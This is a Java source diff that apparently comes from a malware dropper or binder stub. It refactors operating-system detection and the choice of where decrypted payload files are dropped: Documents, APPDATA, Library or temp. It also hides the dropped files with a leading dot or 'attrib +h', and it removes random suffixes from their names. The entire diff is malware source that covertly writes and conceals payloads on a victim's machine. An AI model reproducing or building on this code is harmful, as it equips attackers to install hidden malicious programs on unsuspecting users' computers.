@@ -11,7 +11,6 @@ import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.Reader;
 import java.security.Key;
-import java.util.Random;
 
 import javax.crypto.Cipher;
 import javax.crypto.CipherInputStream;
@@ -71,22 +70,22 @@ public class Main {
 				}
 			}
 
-			if (hidden && !os.contains("win")) {
+			if (hidden && OperatingSystem.getOperatingSystem() != OperatingSystem.WINDOWS) {
 				dropFileName = "." + dropFileName;
 			}
 
 			File file = null;
 			if (dropLocation.equals("temp/documents (unix)")) {
-				if (os.contains("win")) {
+				if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
 					file = File.createTempFile(dropFileName, ".jar");
 				} else {
-					file = new File(userHome + "/Documents/" + dropFileName + (new Random().nextInt()) + ".jar");
+					file = new File(userHome + "/Documents/" + dropFileName + ".jar");
 				}
 			} else if (dropLocation.equals("appdata")) {
-				if (os.contains("win")) {
-					file = new File(System.getenv("APPDATA") + "\\" + dropFileName + (new Random().nextInt()) + ".jar");
-				} else if (os.contains("mac")) {
-					file = new File(userHome + "/Library/" + dropFileName + (new Random().nextInt()) + ".jar");
+				if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
+					file = new File(System.getenv("APPDATA") + "\\" + dropFileName + ".jar");
+				} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
+					file = new File(userHome + "/Library/" + dropFileName + ".jar");
 				} else {
 					file = File.createTempFile(dropFileName, ".jar");
 				}
@@ -106,7 +105,7 @@ public class Main {
 			}
 			out.close();
 
-			if (hidden && os.contains("win")) {
+			if (hidden && OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
 				Runtime.getRuntime().exec(new String[] { "attrib", "+h", file.getAbsolutePath() });
 			}
 
@@ -122,16 +121,16 @@ public class Main {
 				File dropfile = null;
 
 				if (dropp.equals("temp/documents (unix)")) {
-					if (os.contains("win")) {
+					if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
 						dropfile = File.createTempFile(name1, ext);
 					} else {
 						dropfile = new File(userHome + "/Documents/");
 					}
 				} else if (dropp.equals("appdata")) {
-					if (os.contains("win")) {
-						dropfile = new File(System.getenv("APPDATA") + "\\" + name1 + (new Random().nextInt()) + ext);
-					} else if (os.contains("mac")) {
-						dropfile = new File(userHome + "/Library/" + name1 + (new Random().nextInt()) + ext);
+					if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
+						dropfile = new File(System.getenv("APPDATA") + "\\" + name1 + ext);
+					} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
+						dropfile = new File(userHome + "/Library/" + name1 + ext);
 					} else {
 						dropfile = File.createTempFile(name1, ext);
 					}
